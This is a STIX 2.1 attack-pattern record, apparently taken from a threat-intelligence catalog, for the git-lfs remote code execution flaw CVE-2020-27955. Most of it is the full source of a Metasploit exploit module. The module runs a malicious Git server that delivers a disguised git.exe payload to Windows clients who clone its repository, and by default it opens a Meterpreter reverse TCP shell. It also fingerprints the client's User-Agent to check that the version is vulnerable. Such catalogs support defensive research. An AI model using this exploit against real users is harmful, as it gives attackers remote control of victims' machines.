{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a3461ff5-09ed-4172-bcba-eeab73625112",
    "created": "2024-08-14T16:53:45.673004Z",
    "modified": "2024-08-14T16:53:45.673008Z",
    "name": "Git Remote Code Execution via git-lfs (CVE-2020-27955)",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/git_lfs_rce.rb",
            "external_id": "git_lfs_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-27955"
        },
        {
            "source_name": "reference",
            "url": "https://www.helpnetsecurity.com/2020/11/05/cve-2020-27955/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Git\n  include Msf::Exploit::Git::Lfs\n  include Msf::Exploit::Git::SmartHttp\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Git Remote Code Execution via git-lfs (CVE-2020-27955)',\n        'Description' => %q{\n          A critical vulnerability (CVE-2020-27955) in Git Large File Storage (Git LFS), an open source Git extension for\n          versioning large files, allows attackers to achieve remote code execution if the Windows-using victim is tricked\n          into cloning the attacker\u2019s malicious repository using a vulnerable Git version control tool\n        },\n        'Author' => [\n          'Dawid Golunski ', # Discovery\n          'space-r7',        # Guidance, git mixins\n          'jheysel-r7'       # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-27955'],\n          ['URL', 'https://www.helpnetsecurity.com/2020/11/05/cve-2020-27955/']\n        ],\n        'DisclosureDate' => '2020-11-04', # Public disclosure\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Git LFS <= 2.12',\n            {\n              'Platform' => ['win']\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 10\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            ARTIFACTS_ON_DISK\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('GIT_URI', [ false, 'The URI to use as the malicious Git instance (empty for random)', '' ])\n    ])\n    deregister_options('RHOSTS')\n  end\n\n  def setup_repo_structure\n    payload_fname = 'git.exe'\n    @hook_payload = generate_payload_exe\n\n    ptr_file = generate_pointer_file(@hook_payload)\n    git_payload_ptr = GitObject.build_blob_object(ptr_file)\n\n    git_attr_fname = '.gitattributes'\n    git_attr_content = \"#{payload_fname} filter=lfs diff=lfs merge=lfs\"\n    git_attr_obj = GitObject.build_blob_object(git_attr_content)\n\n    register_dir_for_cleanup('.git')\n    register_files_for_cleanup(git_attr_fname)\n\n    # root of repository\n    tree_ent =\n      [\n        {\n          mode: '100644',\n          file_name: git_attr_fname,\n          sha1: git_attr_obj.sha1\n        },\n        {\n          mode: '100755',\n          file_name: payload_fname,\n          sha1: git_payload_ptr.sha1\n        }\n      ]\n\n    tree_obj = GitObject.build_tree_object(tree_ent)\n    commit = GitObject.build_commit_object(tree_sha1: tree_obj.sha1)\n\n    @git_objs =\n      [\n        commit, tree_obj, git_attr_obj, git_payload_ptr\n      ]\n\n    @refs =\n      {\n        'HEAD' => 'refs/heads/master',\n        'refs/heads/master' => commit.sha1\n      }\n  end\n\n  #\n  # Determine whether or not the target is exploitable based on the User-Agent header returned from the client.\n  # The git version must be equal or less than 2.29.2 while git-lfs needs to be equal or less than 2.12.0 to be\n  # exploitable by this vulnerability.\n  #\n  # Returns +true+ if the target is suitable, else fail_with descriptive message\n  #\n  def target_suitable?(user_agent)\n    info = fingerprint_user_agent(user_agent)\n    if info[:ua_name] == Msf::HttpClients::UNKNOWN\n      fail_with(Failure::NoTarget, \"The client's User-Agent string was unidentifiable: #{info}. The client needs to clone the malicious repo on windows with a git version less than 2.29.0\")\n    end\n\n    if info[:os_name] == 'Windows' &&\n       ((info[:ua_name] == Msf::HttpClients::GIT && Rex::Version.new(info[:ua_ver]) <= Rex::Version.new('2.29.2')) ||\n         (info[:ua_name] == Msf::HttpClients::GIT_LFS && Rex::Version.new(info[:ua_ver]) <= Rex::Version.new('2.12')))\n      true\n    else\n      fail_with(Failure::NotVulnerable, \"The git client needs to be running on Windows with a version equal or less than 2.29.2 while git-lfs needs to be equal or less than 2.12.0. The user agent, #{info[:ua_name]}, found was running on, #{info[:os_name]} and was at version: #{info[:ua_ver]}\")\n    end\n  end\n\n  def on_request_uri(cli, req)\n    target_suitable?(req.headers['User-Agent'])\n    if req.uri.include?('git-upload-pack')\n      request = Msf::Exploit::Git::SmartHttp::Request.parse_raw_request(req)\n      case request.type\n      when 'ref-discovery'\n        response = send_refs(request)\n      when 'upload-pack'\n        response = send_requested_objs(request)\n      else\n        fail_with(Failure::UnexpectedReply, 'Git client did not send a valid request')\n      end\n    else\n      response = handle_lfs_objects(req, @hook_payload, @git_addr)\n      unless response.code == 200\n        cli.send_response(response)\n        fail_with(Failure::UnexpectedReply, 'Failed to respond to Git client\\'s LFS request')\n      end\n    end\n    cli.send_response(response)\n  end\n\n  def create_git_uri\n    \"/#{Faker::App.name.downcase}.git\".gsub(' ', '-')\n  end\n\n  def primer\n    @git_repo_uri = datastore['GIT_URI'].empty? ? create_git_uri : datastore['GIT_URI']\n    @git_addr = URI.parse(get_uri).merge(@git_repo_uri)\n    print_status(\"Git repository to clone: #{@git_addr}\")\n    hardcoded_uripath(@git_repo_uri)\n    hardcoded_uripath(\"/#{Digest::SHA256.hexdigest(@hook_payload)}\")\n  end\n\n  def handle_lfs_objects(req, hook_payload, git_addr)\n    git_hook_obj = GitObject.build_blob_object(hook_payload)\n\n    case req.method\n    when 'POST'\n      print_status('Sending payload data...')\n      response = get_batch_response(req, git_addr, git_hook_obj)\n      fail_with(Failure::UnexpectedReply, 'Client request was invalid') unless response\n    when 'GET'\n      print_status('Sending LFS object...')\n      response = get_requested_obj_response(req, git_hook_obj)\n      fail_with(Failure::UnexpectedReply, 'Client sent invalid request') unless response\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to handle client\\'s request')\n    end\n\n    response\n  end\n\n  def send_refs(req)\n    fail_with(Failure::UnexpectedReply, 'Git client did not perform a clone') unless req.service == 'git-upload-pack'\n\n    response = get_ref_discovery_response(req, @refs)\n    fail_with(Failure::UnexpectedReply, 'Failed to build a proper response to the ref discovery request') unless response\n\n    response\n  end\n\n  def send_requested_objs(req)\n    upload_pack_resp = get_upload_pack_response(req, @git_objs)\n    unless upload_pack_resp\n      fail_with(Failure::UnexpectedReply, 'Could not generate upload-pack response')\n    end\n\n    upload_pack_resp\n  end\n\n  def exploit\n    setup_repo_structure\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-11-04, # Public disclosure",
    "x_mitre_platforms": [
        "['win']"
    ]
}